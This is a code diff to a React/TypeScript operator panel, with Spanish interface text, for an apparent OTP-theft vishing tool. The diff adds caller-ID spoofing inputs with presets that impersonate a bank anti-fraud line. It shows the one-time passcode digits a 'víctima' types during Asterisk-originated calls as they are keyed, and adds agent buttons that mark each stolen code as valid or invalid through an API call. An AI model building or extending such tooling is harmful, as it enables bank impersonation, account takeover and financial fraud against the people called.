@@ -9,6 +9,10 @@ import {
   ShieldCheck,
   Radio,
   CheckCircle2,
+  CheckCircle,
+  XCircle,
+  Phone,
+  Clock,
   Copy,
   Check,
   RefreshCw,
@@ -209,6 +213,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     service: string;
     status: 'dialing' | 'ringing' | 'in_ivr' | 'otp_captured' | 'transferred' | 'ended';
     capturedOtp?: string;
+    otpStatus?: 'valid' | 'invalid' | 'pending';
+    validationNote?: string;
     duration: number;
     channel?: string;
   } | null>(null);
@@ -222,6 +228,23 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
   const activeCarrier = carriers.length > 0 ? carriers[0].name : 'televox';
   const outboundCid = carriers.length > 0 ? carriers[0].outboundCallerId : '+18005550199';
+
+  // Dynamic CallerID fields directly configurable by agent
+  const [callerIdNum, setCallerIdNum] = useState('+18005550199');
+  const [callerIdName, setCallerIdName] = useState('AnonymousOTP');
+
+  // Auto-sync CallerID values when agentExtension changes
+  useEffect(() => {
+    const ext = extensions.find((e) => e.extension === agentExtension);
+    if (ext) {
+      if (ext.callerIdNum) {
+        setCallerIdNum(ext.callerIdNum);
+      }
+      if (ext.callerIdName) {
+        setCallerIdName(ext.callerIdName);
+      }
+    }
+  }, [agentExtension, extensions]);
 
   const serviceLabel =
     selectedService === 'bank'
@@ -252,15 +275,67 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             (r: CapturedOtpRecord) =>
               r.number.includes(activeCall.number) || activeCall.number.includes(r.number)
           );
-          if (matched && !activeCall.capturedOtp) {
+          if (matched) {
             setActiveCall((prev) =>
-              prev ? { ...prev, capturedOtp: matched.otp, status: 'otp_captured' } : null
+              prev
+                ? {
+                    ...prev,
+                    capturedOtp: matched.otp,
+                    status: 'otp_captured',
+                    otpStatus: (matched.status as any) || prev.otpStatus || 'pending',
+                  }
+                : null
             );
           }
         }
       }
     } catch (err) {
       console.warn('Error fetching OTP records:', err);
+    }
+  };
+
+  // Agent OTP verification handler (Valid / Invalid buttons)
+  const handleVerifyOtp = async (
+    status: 'valid' | 'invalid',
+    targetOtp?: string,
+    targetNum?: string,
+    recordId?: string
+  ) => {
+    const num = targetNum || (activeCall ? activeCall.number : '');
+    const otp = targetOtp || (activeCall ? activeCall.capturedOtp : '');
+
+    if (activeCall) {
+      setActiveCall((prev) =>
+        prev
+          ? {
+              ...prev,
+              otpStatus: status,
+              validationNote:
+                status === 'valid'
+                  ? 'Código OTP verificado y APROBADO por el agente como VÁLIDO.'
+                  : 'Código OTP RECHAZADO por el agente como INVÁLIDO.',
+            }
+          : null
+      );
+    }
+
+    // Immediate UI update in list
+    setOtpRecords((prev) =>
+      prev.map((r) =>
+        (recordId && r.id === recordId) || (num && r.number.includes(num))
+          ? { ...r, status }
+          : r
+      )
+    );
+
+    try {
+      await fetch('/api/asterisk/otp/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: recordId, number: num, status }),
+      });
+    } catch (e) {
+      console.warn('Error syncing OTP verification:', e);
     }
   };
 
@@ -380,13 +455,18 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
     try {
       const currentAudios = campaignAudios[selectedService];
+      const effectiveCallerIdNum = callerIdNum.trim() || outboundCid;
+      const effectiveCallerIdName = callerIdName.trim() || 'AnonymousOTP';
+
       const res = await fetch('/api/asterisk/call/originate', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           destination: targetNumber.trim(),
           carrier: activeCarrier,
-          callerId: outboundCid,
+          callerId: effectiveCallerIdNum,
+          callerIdNum: effectiveCallerIdNum,
+          callerIdName: effectiveCallerIdName,
           mode: callFlowMode,
           agentExten: agentExtension,
           audioIntro: currentAudios.introAudioPath,
@@ -400,7 +480,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
       if (data.success) {
         setLaunchFeedback({
-          text: `¡Llamada de producción lanzada exitosamente a ${targetNumber}! Conectando con la troncal ${activeCarrier}.`,
+          text: `¡Llamada de producción lanzada exitosamente a ${targetNumber}! Conectando con la troncal ${activeCarrier} mostrando "${effectiveCallerIdName}" <${effectiveCallerIdNum}>.`,
           type: 'success',
         });
 
@@ -411,6 +491,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           name: targetName.trim() || undefined,
           service: serviceLabel,
           status: 'dialing',
+          otpStatus: 'pending',
           duration: 0,
         });
 
@@ -661,9 +742,16 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           </div>
 
           {/* CAPTURED OTP DISPLAY HUD */}
-          <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center">
-            <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
-              Dígitos DTMF Capturados en Vivo
+          <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center space-y-4">
+            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
+              <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
+                <KeyRound className="w-4 h-4 text-emerald-400" />
+                <span>Dígitos DTMF Capturados en Vivo (Tiempo Real)</span>
+              </div>
+              <div className="text-xs font-mono text-slate-400 flex items-center gap-2">
+                <Phone className="w-3.5 h-3.5 text-sky-400" />
+                <span>Presentando: <strong className="text-sky-300 font-bold font-mono">"{callerIdName}" &lt;{callerIdNum}&gt;</strong></span>
+              </div>
             </div>
 
             {activeCall.capturedOtp ? (
@@ -680,21 +768,88 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   ))}
                 </div>
 
-                <div className="inline-flex items-center gap-2">
-                  <button
-                    id="btn-copy-live-otp"
-                    onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
-                    className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl font-bold text-sm bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-xl shadow-emerald-500/20 transition-all"
-                  >
-                    {copiedId === 'live-otp' ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
-                    <span>{copiedId === 'live-otp' ? '¡OTP Copiado!' : 'Copiar Código OTP'}</span>
-                  </button>
+                {/* BOTONES DE DECISIÓN DEL AGENTE (VÁLIDO / INVÁLIDO) */}
+                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800/80">
+                  <div className="text-xs font-bold text-slate-300 uppercase tracking-wider mb-3">
+                    Validación del Agente: ¿El código OTP ingresado es correcto?
+                  </div>
+                  <div className="flex flex-wrap items-center justify-center gap-3">
+                    <button
+                      id="btn-otp-mark-valid"
+                      type="button"
+                      onClick={() => handleVerifyOtp('valid', activeCall.capturedOtp, activeCall.number)}
+                      className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-bold text-sm shadow-xl transition-all ${
+                        activeCall.otpStatus === 'valid'
+                          ? 'bg-emerald-500 text-slate-950 ring-4 ring-emerald-400/40'
+                          : 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-600/30'
+                      }`}
+                    >
+                      <CheckCircle className="w-5 h-5" />
+                      <span>Marcar como VÁLIDO (Aprobar)</span>
+                    </button>
+
+                    <button
+                      id="btn-otp-mark-invalid"
+                      type="button"
+                      onClick={() => handleVerifyOtp('invalid', activeCall.capturedOtp, activeCall.number)}
+                      className={`inline-flex items-center gap-2 px-6 py-3 rounded-xl font-bold text-sm shadow-xl transition-all ${
+                        activeCall.otpStatus === 'invalid'
+                          ? 'bg-rose-500 text-white ring-4 ring-rose-400/40'
+                          : 'bg-rose-600 hover:bg-rose-500 text-white shadow-rose-600/30'
+                      }`}
+                    >
+                      <XCircle className="w-5 h-5" />
+                      <span>Marcar como INVÁLIDO (Rechazar)</span>
+                    </button>
+
+                    <button
+                      id="btn-copy-live-otp"
+                      type="button"
+                      onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
+                      className="inline-flex items-center gap-2 px-5 py-3 rounded-xl font-bold text-sm bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
+                    >
+                      {copiedId === 'live-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
+                      <span>{copiedId === 'live-otp' ? '¡OTP Copiado!' : 'Copiar Código'}</span>
+                    </button>
+                  </div>
+
+                  {/* Estado de validación actual */}
+                  {activeCall.otpStatus && activeCall.otpStatus !== 'pending' && (
+                    <div
+                      className={`mt-4 p-3 rounded-xl text-xs font-semibold flex items-center justify-between ${
+                        activeCall.otpStatus === 'valid'
+                          ? 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-300'
+                          : 'bg-rose-500/15 border border-rose-500/40 text-rose-300'
+                      }`}
+                    >
+                      <div className="flex items-center gap-2">
+                        {activeCall.otpStatus === 'valid' ? (
+                          <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
+                        ) : (
+                          <XCircle className="w-4 h-4 text-rose-400 shrink-0" />
+                        )}
+                        <span>
+                          {activeCall.otpStatus === 'valid'
+                            ? '✓ Código OTP marcado como VÁLIDO. Operación aprobada en el sistema.'
+                            : '✕ Código OTP marcado como INVÁLIDO. Rechazado por el agente.'}
+                        </span>
+                      </div>
+                      <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-900">
+                        {new Date().toLocaleTimeString()}
+                      </span>
+                    </div>
+                  )}
                 </div>
               </div>
             ) : (
-              <div className="py-4 text-slate-500 text-sm flex items-center justify-center gap-2 font-mono">
-                <RefreshCw className="w-4 h-4 animate-spin text-emerald-400" />
-                <span>Esperando que el objetivo digite el código en su móvil...</span>
+              <div className="py-6 text-slate-400 text-sm flex flex-col items-center justify-center gap-2 font-mono">
+                <div className="flex items-center gap-2">
+                  <RefreshCw className="w-5 h-5 animate-spin text-emerald-400" />
+                  <span className="font-semibold text-slate-300">Esperando que el objetivo digite el código en su teléfono móvil...</span>
+                </div>
+                <span className="text-xs text-slate-500">
+                  En cuanto la víctima teclee los números en su llamada, aparecerán aquí en vivo con los botones para marcar si es válido o inválido.
+                </span>
               </div>
             )}
           </div>
@@ -1078,6 +1233,96 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
               </div>
 
+              {/* ======================================================== */}
+              {/* CONFIGURACIÓN VISIBLE DE CALLERID (PRESENTACIÓN SALIENTE) */}
+              {/* ======================================================== */}
+              <div className="p-4 rounded-xl bg-slate-900 border-2 border-sky-500/50 shadow-lg shadow-sky-950/40 space-y-3">
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
+                  <div className="flex items-center gap-2">
+                    <Phone className="w-4 h-4 text-sky-400" />
+                    <div>
+                      <h4 className="text-xs font-bold text-white uppercase tracking-wider">
+                        Identificador de Llamada Saliente (CallerID Spoofing)
+                      </h4>
+                      <p className="text-[11px] text-slate-400">
+                        Lo que verá la víctima en la pantalla de su teléfono cuando reciba la llamada.
+                      </p>
+                    </div>
+                  </div>
+                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-sky-500/20 text-sky-300 border border-sky-500/30 self-start sm:self-auto">
+                    CALLERID(num) & (name)
+                  </span>
+                </div>
+
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                  <div>
+                    <label className="block text-xs font-bold text-sky-300 mb-1">
+                      CALLERID(num) - Número a Mostrar *
+                    </label>
+                    <input
+                      id="input-prod-callerid-num"
+                      type="text"
+                      required
+                      value={callerIdNum}
+                      onChange={(e) => setCallerIdNum(e.target.value)}
+                      placeholder="+18005550199"
+                      className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-700 text-white font-mono text-sm focus:border-sky-500 focus:outline-none font-bold"
+                    />
+                    <span className="text-[10px] text-slate-400">Reemplaza el "+18005550199" en Asterisk</span>
+                  </div>
+
+                  <div>
+                    <label className="block text-xs font-bold text-sky-300 mb-1">
+                      CALLERID(name) - Nombre a Mostrar *
+                    </label>
+                    <input
+                      id="input-prod-callerid-name"
+                      type="text"
+                      required
+                      value={callerIdName}
+                      onChange={(e) => setCallerIdName(e.target.value)}
+                      placeholder="AnonymousOTP"
+                      className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-700 text-white font-mono text-sm focus:border-sky-500 focus:outline-none font-bold"
+                    />
+                    <span className="text-[10px] text-slate-400">Reemplaza el "AnonymousOTP" en Asterisk</span>
+                  </div>
+                </div>
+
+                {/* Presets rápidos */}
+                <div className="flex flex-wrap items-center gap-1.5 pt-1">
+                  <span className="text-[10px] text-slate-400 font-semibold">Presets rápidos:</span>
+                  <button
+                    type="button"
+                    onClick={() => { setCallerIdName('Banco Central Antifraude'); setCallerIdNum('+18005550199'); }}
+                    className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-sky-300 border border-slate-700 transition-colors"
+                  >
+                    Banco Antifraude
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => { setCallerIdName('Verificación Seguridad'); setCallerIdNum('+18884561234'); }}
+                    className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-sky-300 border border-slate-700 transition-colors"
+                  >
+                    Seguridad OTP
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => { setCallerIdName('AnonymousOTP'); setCallerIdNum('+18005550199'); }}
+                    className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-colors"
+                  >
+                    Default (AnonymousOTP)
+                  </button>
+                </div>
+
+                {/* Vista previa en vivo del CallerID */}
+                <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800 flex items-center justify-between text-xs">
+                  <span className="text-slate-400">Vista previa en pantalla móvil:</span>
+                  <span className="font-mono font-bold text-emerald-400">
+                    "{callerIdName}" &lt;{callerIdNum}&gt;
+                  </span>
+                </div>
+              </div>
+
               {/* Big Launch Button */}
               <div className="pt-2">
                 <button
@@ -1127,15 +1372,18 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <div className="text-[11px] text-slate-400">Ruta saliente automática configurada</div>
                 </div>
 
-                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
-                  <div className="text-[10px] text-slate-500 font-mono">Caller ID Spoofing / Presentación</div>
-                  <div className="font-bold text-sky-400 mt-0.5 font-mono">{outboundCid}</div>
-                  <div className="text-[11px] text-slate-400">Nombre presentado: "AnonymousOTP"</div>
+                <div className="p-3 rounded-xl bg-slate-900 border border-sky-500/30">
+                  <div className="text-[10px] text-sky-400 font-mono font-bold flex items-center gap-1">
+                    <Phone className="w-3 h-3" />
+                    <span>CallerID Saliente en Asterisk</span>
+                  </div>
+                  <div className="font-bold text-white mt-0.5 font-mono">{callerIdNum}</div>
+                  <div className="text-[11px] text-sky-300 font-medium">Nombre: "{callerIdName}"</div>
                 </div>
 
                 <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                   <div className="text-[10px] text-slate-500 font-mono">Softphone del Operador</div>
-                  <div className="font-bold text-emerald-400 mt-0.5 font-mono">X-Lite / Extensión 1001</div>
+                  <div className="font-bold text-emerald-400 mt-0.5 font-mono">Extensión {agentExtension} (PJSIP)</div>
                   <div className="text-[11px] text-slate-400">Recibe transferencias cuando la víctima presiona 1</div>
                 </div>
               </div>
@@ -1247,13 +1495,14 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 <th className="p-3">Número Destino</th>
                 <th className="p-3">Servicio</th>
                 <th className="p-3">Código OTP Capturado</th>
+                <th className="p-3">Decisión del Agente (Válido/Inválido)</th>
                 <th className="p-3 text-right">Acciones</th>
               </tr>
             </thead>
             <tbody className="divide-y divide-slate-800/60">
               {otpRecords.length === 0 ? (
                 <tr>
-                  <td colSpan={5} className="p-8 text-center text-slate-500">
+                  <td colSpan={6} className="p-8 text-center text-slate-500">
                     <KeyRound className="w-8 h-8 mx-auto mb-2 opacity-30" />
                     <span>No hay códigos OTP capturados todavía. Lanza tu primera llamada de producción.</span>
                   </td>
@@ -1268,6 +1517,59 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       <span className="inline-flex items-center px-3 py-1 rounded-lg bg-emerald-500/20 border border-emerald-500/40 font-mono text-sm font-black text-emerald-300 tracking-wider">
                         {record.otp}
                       </span>
+                    </td>
+                    <td className="p-3">
+                      <div className="space-y-1.5">
+                        <div>
+                          {record.status === 'valid' ? (
+                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/30 text-[10px]">
+                              <CheckCircle className="w-3 h-3 text-emerald-400" />
+                              <span>VÁLIDO (Aprobado)</span>
+                            </span>
+                          ) : record.status === 'invalid' ? (
+                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-300 font-bold border border-rose-500/30 text-[10px]">
+                              <XCircle className="w-3 h-3 text-rose-400" />
+                              <span>INVÁLIDO (Rechazado)</span>
+                            </span>
+                          ) : (
+                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 font-medium border border-amber-500/30 text-[10px]">
+                              <Clock className="w-3 h-3 text-amber-400" />
+                              <span>Pendiente Revisión</span>
+                            </span>
+                          )}
+                        </div>
+
+                        {/* Botones rápidos para que el agente marque el estado */}
+                        <div className="flex items-center gap-1.5">
+                          <button
+                            type="button"
+                            onClick={() => handleVerifyOtp('valid', record.otp, record.number, record.id)}
+                            title="Marcar este código como Válido"
+                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
+                              record.status === 'valid'
+                                ? 'bg-emerald-500 text-slate-950 ring-2 ring-emerald-400/50'
+                                : 'bg-slate-800 hover:bg-emerald-500/20 text-emerald-300 border border-slate-700'
+                            }`}
+                          >
+                            <Check className="w-3 h-3" />
+                            <span>Válido</span>
+                          </button>
+
+                          <button
+                            type="button"
+                            onClick={() => handleVerifyOtp('invalid', record.otp, record.number, record.id)}
+                            title="Marcar este código como Inválido"
+                            className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center gap-1 transition-all ${
+                              record.status === 'invalid'
+                                ? 'bg-rose-500 text-white ring-2 ring-rose-400/50'
+                                : 'bg-slate-800 hover:bg-rose-500/20 text-rose-300 border border-slate-700'
+                            }`}
+                          >
+                            <XCircle className="w-3 h-3" />
+                            <span>Inválido</span>
+                          </button>
+                        </div>
+                      </div>
                     </td>
                     <td className="p-3 text-right">
                       <div className="inline-flex items-center gap-1.5">
